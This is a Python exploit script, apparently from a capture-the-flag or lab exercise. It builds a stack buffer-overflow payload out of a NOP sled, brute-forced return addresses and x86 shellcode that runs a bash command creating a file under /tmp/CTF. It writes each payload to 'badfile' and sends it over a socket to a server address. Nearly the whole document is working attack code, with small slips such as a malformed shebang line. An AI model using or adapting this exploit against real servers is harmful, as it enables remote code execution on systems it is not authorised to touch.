#/usr/bin/python3
import socket
import sys

def send_to_server(data):
    host = "10.152.183.104"      # Need to change to the actual IP address
    port = 9014                 # Need to change to the actual port number
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.sendall(data)
    s.close()

shellcode= (
    # Push the command '/bin////bash' into stack (//// is equivalent to /)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""bash"                    # pushl "bash"
    "\x68""////"                    # pushl "////"
    "\x68""/bin"                    # pushl "/bin"
    "\x89\xe3"                      # movl %esp, %ebx  

    # Push the 1st argument '-ccc' into stack (-ccc is equivalent to -c)
    "\x31\xc0"                      # xorl %eax,%eax
    "\x50"                          # pushl %eax
    "\x68""-ccc"                    # pushl "-ccc"
    "\x89\xe0"                      # movl %esp, %eax


    # Push the 2nd argument '/usr/bin/touch /tmp/CTF/team.jpg' into stack
    "\x31\xd2"                      # xorl %edx,%edx
    "\x52"                          # pushl %edx
    "\x68""    "                    # pushl "    "
    "\x68""pg  "                    # pushl "    "
    "\x68""14.j"                    # pushl ".jpg"
    "\x68""team"                    # pushl "team"
    "\x68""////"                    # pushl "////"
    "\x68""/CTF"                    # pushl "/CTF"
    "\x68""/tmp"                    # pushl "/tmp"
    "\x68""ch  "                    # pushl "ch  "
    "\x68""/tou"                    # pushl "/tou"
    "\x68""/bin"                    # pushl "/bin"
    "\x68""/usr"                    # pushl "/usr"
    "\x89\xe2"                      # movl %esp,%edx

    # Construct the argv[] array and set ecx
    "\x31\xc9"                      # xorl %ecx,%ecx
    "\x51"                          # pushl %ecx
    "\x52"                          # pushl %edx
    "\x50"                          # pushl %eax
    "\x53"                          # pushl %ebx
    "\x89\xe1"                      # movl %esp,%ecx  

    # Set edx to 0
    "\x31\xd2"                      #xorl %edx,%edx   

    # Invoke the system call
    "\x31\xc0"                      # xorl %eax,%eax
    "\xb0\x0b"                      # movb $0x0b,%al 
    "\xcd\x80"                      # int $0x80
).encode('latin-1')


# Fill the content with NOP's
content = bytearray(0x90 for i in range(2000))

#########################################################################
D = 350                         # You need to change this value
while (D < 600):
	target_address = 0xBFFFDC50 + D + 8
	# Fill the return address field with the address of the shellcode
	content[D:D+4] = (target_address).to_bytes(4, byteorder='little')
	D += 4

# Put the shellcode at the end
	start = 2000 - len(shellcode)
	content[start:] = shellcode

# Write the content to badfile
	file = open("badfile", "wb")
	file.write(content)
	file.close()

# Send content to server
	send_to_server(content)
